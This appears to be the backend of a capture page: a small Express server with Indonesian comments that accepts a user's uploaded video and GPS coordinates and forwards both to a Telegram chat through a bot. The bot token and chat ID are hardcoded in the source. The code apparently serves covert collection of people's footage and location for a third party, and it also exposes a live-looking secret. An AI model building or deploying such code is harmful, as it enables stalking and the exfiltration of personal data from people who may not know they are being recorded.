const express = require("express");
const multer = require("multer");
const axios = require("axios");
const fs = require("fs");
const FormData = require("form-data");

const app = express();
const upload = multer({ dest: "uploads/" });

// Ambil dari Railway ENV
const BOT_TOKEN = "8734665008:AAHPemOmUrDII54B0tnmzq5NX5VkT9IXOaY";
const CHAT_ID = " 6677303168";

app.post("/upload", upload.single("video"), async (req, res) => {
  try {
    const lat = req.body.lat;
    const lon = req.body.lon;
    const filePath = req.file.path;

    // Kirim lokasi
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: `📍 Lokasi User:\nLat: ${lat}\nLon: ${lon}`
    });

    // Kirim video
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("video", fs.createReadStream(filePath));

    await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
      form,
      { headers: form.getHeaders() }
    );

    res.send("OK");
  } catch (err) {
    console.log(err);
    res.status(500).send("Error");
  }
});

app.get("/", (req, res) => {
  res.send("Server aktif");
});

app.listen(3000, () => console.log("Server jalan di port 3000"));
